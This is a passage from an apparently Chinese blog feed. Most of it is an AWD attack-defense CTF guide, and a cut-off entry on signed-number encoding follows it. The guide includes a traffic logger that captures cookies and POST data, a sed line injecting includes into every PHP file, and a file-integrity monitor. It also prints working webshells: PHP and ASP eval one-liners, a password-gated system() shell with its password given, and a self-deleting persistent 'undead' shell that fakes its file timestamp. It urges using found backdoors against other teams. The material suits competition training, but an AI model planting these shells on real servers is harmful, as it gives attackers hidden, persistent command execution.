invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>,<span class="hljs-title function_ invoke__">time</span>());     <span class="hljs-comment">//访问时间</span><br><span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>);       <span class="hljs-comment">//接收POST数据</span><br><span class="hljs-variable">$others</span> = <span class="hljs-string">&#x27;...其他你想得到的信息...&#x27;</span>;<br><span class="hljs-variable">$logadd</span> = <span class="hljs-string">&#x27;Visit Time：&#x27;</span>.<span class="hljs-variable">$time</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-string">&#x27;Visit IP：&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-string">&#x27;RequestURI：&#x27;</span>.<span class="hljs-variable">$uri</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$parameter</span>.<span class="hljs-string">&#x27;RequestMethod：&#x27;</span>.<span class="hljs-variable">$method</span>.<span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-comment">// log记录</span><br><span class="hljs-variable">$fh</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;/tmp/log.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fh</span>, <span class="hljs-variable">$logadd</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fh</span>, <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$_COOKIE</span>, <span class="hljs-literal">true</span>).<span class="hljs-string">&quot;\r\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fh</span>, <span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;\r\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fh</span>, <span class="hljs-variable">$others</span>.<span class="hljs-string">&quot;\r\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>这种脚本一般放置在CMS的入口文件处，下面列出几个常见CMS的入口地址，在这些入口的文件里使用<code>require_once()</code>就可以将监控脚本包含进去，达到流量监控的目的：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">PHPCMS V9 \phpcms\base.php<br>PHPWIND8.<span class="hljs-number">7</span> \data\sql_config.php<br>DEDECMS5.<span class="hljs-number">7</span> \data\common.inc.php<br>DiscuzX2   \config\config_global.php<br>Wordpress   \wp-config.php<br>Metinfo   \<span class="hljs-keyword">include</span>\head.php<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo find /var/www/html/ -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php /&lt;?php\nrequire_once(&#x27;\/var\/www\/html\/waf2.php&#x27;);\n/g&quot;<br><span class="hljs-meta">#</span><span class="language-bash">意思就是查找需要加waf的目录下所有php文件，在头部添加一句，用require_once函数引入/tmp/waf.php文件。因为sed命令利用 / 区分文件中的原字符串和修改的字符串，所以我们要对 / 进行转义。类似于在单引号中再次使用单引号时我们也要用反斜杠转义。</span><br></code></pre></td></tr></table></figure><h4 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h4><blockquote><p>文件监控也是一个比较imba的脚本了，就是将任何没有免死金牌的上传文件全部拦截，上传一个我就自动给你删掉，或者将其中的文件内容直接全部修改掉，这种脚本说实话也是比较危险，看实际情况判断一下吧，下面就是一个文件监控脚本：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#use: python file_check.py ./</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> shutil<br><span class="hljs-keyword">import</span> ntpath<br><span class="hljs-keyword">import</span> time<br><br>CWD = os.getcwd()<br>FILE_MD5_DICT = &#123;&#125;      <span class="hljs-comment"># 文件MD5字典</span><br>ORIGIN_FILE_LIST = []<br><br><span class="hljs-comment"># 特殊文件路径字符串</span><br>Special_path_str = <span class="hljs-string">&#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;</span><br>bakstring = <span class="hljs-string">&#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;</span><br>logstring = <span class="hljs-string">&#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br>webshellstring = <span class="hljs-string">&#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br>difffile = <span class="hljs-string">&#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;</span><br><br>Special_string = <span class="hljs-string">&#x27;diaossama&#x27;</span>  <span class="hljs-comment"># 免死金牌</span><br>UNICODE_ENCODING = <span class="hljs-string">&quot;utf-8&quot;</span><br>INVALID_UNICODE_CHAR_FORMAT = <span class="hljs-string">r&quot;\?%02x&quot;</span><br><br><span class="hljs-comment"># 文件路径字典</span><br>spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))<br>Special_path = &#123;<br>    <span class="hljs-string">&#x27;bak&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),<br>    <span class="hljs-string">&#x27;log&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),<br>    <span class="hljs-string">&#x27;webshell&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),<br>    <span class="hljs-string">&#x27;difffile&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">isListLike</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">isinstance</span>(value, (<span class="hljs-built_in">list</span>, <span class="hljs-built_in">tuple</span>, <span class="hljs-built_in">set</span>))<br><br><span class="hljs-comment"># 获取Unicode编码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUnicode</span>(<span class="hljs-params">value, encoding=<span class="hljs-literal">None</span>, noneToNull=<span class="hljs-literal">False</span></span>):<br><br>    <span class="hljs-keyword">if</span> noneToNull <span class="hljs-keyword">and</span> value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> NULL<br><br>    <span class="hljs-keyword">if</span> isListLike(value):<br>        value = <span class="hljs-built_in">list</span>(getUnicode(_, encoding, noneToNull) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> value)<br>        <span class="hljs-keyword">return</span> value<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(value, unicode):<br>        <span class="hljs-keyword">return</span> value<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">isinstance</span>(value, basestring):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">return</span> unicode(value, encoding <span class="hljs-keyword">or</span> UNICODE_ENCODING)<br>            <span class="hljs-keyword">except</span> UnicodeDecodeError, ex:<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">return</span> unicode(value, UNICODE_ENCODING)<br>                <span class="hljs-keyword">except</span>:<br>                    value = value[:ex.start] + <span class="hljs-string">&quot;&quot;</span>.join(INVALID_UNICODE_CHAR_FORMAT % <span class="hljs-built_in">ord</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">return</span> unicode(value)<br>        <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>            <span class="hljs-keyword">return</span> unicode(<span class="hljs-built_in">str</span>(value), errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><br><span class="hljs-comment"># 目录创建</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mkdir_p</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-keyword">import</span> errno<br>    <span class="hljs-keyword">try</span>:<br>        os.makedirs(path)<br>    <span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> exc:<br>        <span class="hljs-keyword">if</span> exc.errno == errno.EEXIST <span class="hljs-keyword">and</span> os.path.isdir(path):<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">else</span>: <span class="hljs-keyword">raise</span><br><br><span class="hljs-comment"># 获取当前所有文件路径</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getfilelist</span>(<span class="hljs-params">cwd</span>):<br>    filelist = []<br>    <span class="hljs-keyword">for</span> root,subdirs, files <span class="hljs-keyword">in</span> os.walk(cwd):<br>        <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> files:<br>            originalfile = os.path.join(root, filepath)<br>            <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> originalfile:<br>                filelist.append(originalfile)<br>    <span class="hljs-keyword">return</span> filelist<br><br><span class="hljs-comment"># 计算机文件MD5值</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calcMD5</span>(<span class="hljs-params">filepath</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filepath,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            md5obj = hashlib.md5()<br>            md5obj.update(f.read())<br>            <span class="hljs-built_in">hash</span> = md5obj.hexdigest()<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span><br>    <span class="hljs-keyword">except</span> Exception, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[!] getmd5_error : &#x27;</span> + getUnicode(filepath)<br>        <span class="hljs-built_in">print</span> getUnicode(e)<br>        <span class="hljs-keyword">try</span>:<br>            ORIGIN_FILE_LIST.remove(filepath)<br>            FILE_MD5_DICT.pop(filepath, <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">except</span> KeyError, e:<br>            <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment"># 获取所有文件MD5</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getfilemd5dict</span>(<span class="hljs-params">filelist = []</span>):<br>    filemd5dict = &#123;&#125;<br>    <span class="hljs-keyword">for</span> ori_file <span class="hljs-keyword">in</span> filelist:<br>        <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ori_file:<br>            md5 = calcMD5(os.path.realpath(ori_file))<br>            <span class="hljs-keyword">if</span> md5:<br>                filemd5dict[ori_file] = md5<br>    <span class="hljs-keyword">return</span> filemd5dict<br><br><span class="hljs-comment"># 备份所有文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backup_file</span>(<span class="hljs-params">filelist=[]</span>):<br>    <span class="hljs-comment"># if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:</span><br>    <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> filelist:<br>        <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> filepath:<br>            shutil.copy2(filepath, Special_path[<span class="hljs-string">&#x27;bak&#x27;</span>])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;---------start------------&#x27;</span><br>    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> Special_path:<br>        mkdir_p(Special_path[value])<br>    <span class="hljs-comment"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span><br>    ORIGIN_FILE_LIST = getfilelist(CWD)<br>    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)<br>    backup_file(ORIGIN_FILE_LIST) <span class="hljs-comment"># TODO 备份文件可能会产生重名BUG</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[*] pre work end!&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        file_list = getfilelist(CWD)<br>        <span class="hljs-comment"># 移除新上传文件</span><br>        diff_file_list = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(file_list) ^ <span class="hljs-built_in">set</span>(ORIGIN_FILE_LIST))<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(diff_file_list) != <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># import pdb;pdb.set_trace()</span><br>            <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> diff_file_list:<br>                <span class="hljs-keyword">try</span>:<br>                    f = <span class="hljs-built_in">open</span>(filepath, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>                <span class="hljs-keyword">except</span> Exception, e:<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> Special_string <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> f:<br>                    <span class="hljs-keyword">try</span>:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[*] webshell find : &#x27;</span> + getUnicode(filepath)<br>                        shutil.move(filepath, os.path.join(Special_path[<span class="hljs-string">&#x27;webshell&#x27;</span>], ntpath.basename(filepath) + <span class="hljs-string">&#x27;.txt&#x27;</span>))<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filepath)<br>                    <span class="hljs-keyword">try</span>:<br>                        f = <span class="hljs-built_in">open</span>(os.path.join(Special_path[<span class="hljs-string">&#x27;log&#x27;</span>], <span class="hljs-string">&#x27;log.txt&#x27;</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>                        f.write(<span class="hljs-string">&#x27;newfile: &#x27;</span> + getUnicode(filepath) + <span class="hljs-string">&#x27; : &#x27;</span> + <span class="hljs-built_in">str</span>(time.ctime()) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                        f.close()<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[-] log error : file move error: &#x27;</span> + getUnicode(e)<br><br>        <span class="hljs-comment"># 防止任意文件被修改,还原被修改文件</span><br>        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)<br>        <span class="hljs-keyword">for</span> filekey <span class="hljs-keyword">in</span> md5_dict:<br>            <span class="hljs-keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:<br>                <span class="hljs-keyword">try</span>:<br>                    f = <span class="hljs-built_in">open</span>(filekey, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>                <span class="hljs-keyword">except</span> Exception, e:<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> Special_string <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> f:<br>                    <span class="hljs-keyword">try</span>:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[*] file had be change : &#x27;</span> + getUnicode(filekey)<br>                        shutil.move(filekey, os.path.join(Special_path[<span class="hljs-string">&#x27;difffile&#x27;</span>], ntpath.basename(filekey) + <span class="hljs-string">&#x27;.txt&#x27;</span>))<br>                        shutil.move(os.path.join(Special_path[<span class="hljs-string">&#x27;bak&#x27;</span>], ntpath.basename(filekey)), filekey)<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filekey)<br>                    <span class="hljs-keyword">try</span>:<br>                        f = <span class="hljs-built_in">open</span>(os.path.join(Special_path[<span class="hljs-string">&#x27;log&#x27;</span>], <span class="hljs-string">&#x27;log.txt&#x27;</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>                        f.write(<span class="hljs-string">&#x27;diff_file: &#x27;</span> + getUnicode(filekey) + <span class="hljs-string">&#x27; : &#x27;</span> + getUnicode(time.ctime()) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                        f.close()<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[-] log error : done_diff: &#x27;</span> + getUnicode(filekey)<br>                        <span class="hljs-keyword">pass</span><br>        time.sleep(<span class="hljs-number">2</span>)<br>        <span class="hljs-comment"># print &#x27;[*] &#x27; + getUnicode(time.ctime())</span><br></code></pre></td></tr></table></figure><h3 id="6-预留后门"><a href="#6-预留后门" class="headerlink" title="6. 预留后门"></a>6. 预留后门</h3><blockquote><p>一般来说，在每一台服务器上可能已经预留了一个或多个后门，这时候我们就可以把一开始备份的源码传输到本地，拖进D盾里扫一扫，发现后门的话可以先把自己的后门处理掉，然后利用这个后门看看能不能去打一下别人，传个马之类的</p></blockquote><p><img src="https://i.loli.net/2021/03/30/e1KgfhJclHopNB7.png" alt="image-20210330090345761"></p><h3 id="7-权限维持"><a href="#7-权限维持" class="headerlink" title="7. 权限维持"></a>7. 权限维持</h3><blockquote><p>说道权限维持，那肯定是一句话木马，不死马，反弹shell等一系列操作了，发现漏洞之后传个马，才有利于后面更好的得分</p></blockquote><h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p>一句话木马那方法就很多了，比如最简单的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(REQUEST[<span class="hljs-string">&#x27;diaossama&#x27;</span>]); <span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//php</span><br>&lt;%<span class="hljs-keyword">eval</span> <span class="hljs-title function_ invoke__">request</span>(<span class="hljs-string">&quot;xx&quot;</span>)%&gt;    <span class="hljs-comment">//aspCopy</span><br></code></pre></td></tr></table></figure><h4 id="MD5马"><a href="#MD5马" class="headerlink" title="MD5马"></a>MD5马</h4><p>但是这种一句话木马很容易被人利用，你想想你把别人服务器弄了，结果别人一看你的shell密码转头就用你的shell去弄别人，那不是被人白嫖。所以就有了其他的马，比如MD5马和RSA马，下面就是一个MD5马的例子（还可以加header双重验证）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>]) == <span class="hljs-string">&quot;78842815248300fa6ae79f7776a5080a&quot;</span>)&#123; @ <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[cmd]);&#125;<span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//pass:jonathan</span><br></code></pre></td></tr></table></figure><h4 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h4><blockquote><p>有了MD5马还不够，我们还得让我们的马可以一直留存在别人的服务器上，所以就有了不死马。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.conf.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;78842815248300fa6ae79f7776a5080a&quot;)&#123;@system($_POST[cmd]);&#125;?&gt;&#x27;</span>; <br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .conf.php&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);<br>&#125;<br><br>pass:jonathan<br><br></code></pre></td></tr></table></figure><p>知道了怎么写不死马，那就得知道怎么杀不死马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br> <span class="hljs-variable">$pid</span>=<span class="hljs-number">1234</span>;<br> @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;.demo.php&#x27;</span>);<br> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;kill -9 $pid&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>先用<code>ps</code>命令查看进程的pid，再修改一下上面的脚本执行即可</p><p>或者我们也可以用<code>ps aux</code>命令来查看每个用户执行的命令和运行的进程</p><p>一般是写一个脚本不断生成那个不死马的同名文件，使那个不死马无法在该目录下创建文件，然后再找到那个不断创建不死马的进程将其杀死。</p></blockquote><h3 id="8-日志分析"><a href="#8-日志分析" class="headerlink" title="8. 日志分析"></a>8. 日志分析</h3><blockquote><p>比赛中如果抓不到有用的流量，日志分析也是很有用的，分析服务器的访问日志也可以发现一些信息，下面罗列了一些服务器的日志路径</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">apache: <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>access.log<br>nginx: <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span><br></code></pre></td></tr></table></figure><h3 id="9-最重要的事情"><a href="#9-最重要的事情" class="headerlink" title="9.最重要的事情"></a>9.最重要的事情</h3><p>所谓最重要的事情就是团队合作的问题</p><p><strong>分工明确</strong> 是重中之重 每个人分配好每个人的工作 密码更改成什么 都是双方约定好的 备份的文件存放位置也是固定好的</p><p>这样就会很有条理 什么做了 什么没做 心里都有数</p><p>一个人的事情做好了 就去做可以共同做的事情比如代码审计 把可以利用的点 截图放到一个文档里面 以免忘记 在可以攻击的时候利用这些已知的点进行攻击</p><p>一位同学负责攻 一位同学负责辅助攻击的同时继续加固服务器。</p>]]></content>
    
    
    
    <tags>
      
      <tag>AWD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机中的原码 反码 补码</title>
    <link href="/2022/03/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%AD%E7%9A%84%E5%8E%9F%E7%A0%81-%E5%8F%8D%E7%A0%81-%E8%A1%A5%E7%A0%81/"/>
    <url>/2022/03/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%AD%E7%9A%84%E5%8E%9F%E7%A0%81-%E5%8F%8D%E7%A0%81-%E8%A1%A5%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h3 id="计算机中的原码-反码-补码"><a href="#计算机中的原码-反码-补码" class="headerlink" title="计算机中的原码 反码 补码"></a>计算机中的原码 反码 补码</h3><p>12&#x2F;20&#x2F;2020</p><p>晴    正常</p><p>最近在学C语言<br>刚好学到计算机中的有符号的数据表示<br>在百度上看的文章不太懂<br>在此记录一下~</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">有符号数据的表示<br><br>符号：用0、1表示正负号，放在数值的最高位<br>小数点：<br>      定点数：约定小数点隐含在某一位置上<br>      浮点数：小数点可以任意浮动<br><br>注意：小数点均不占位数<br><br>在计算机中：有符号数可表示为原码、反码、补码<br>    原码：<br>        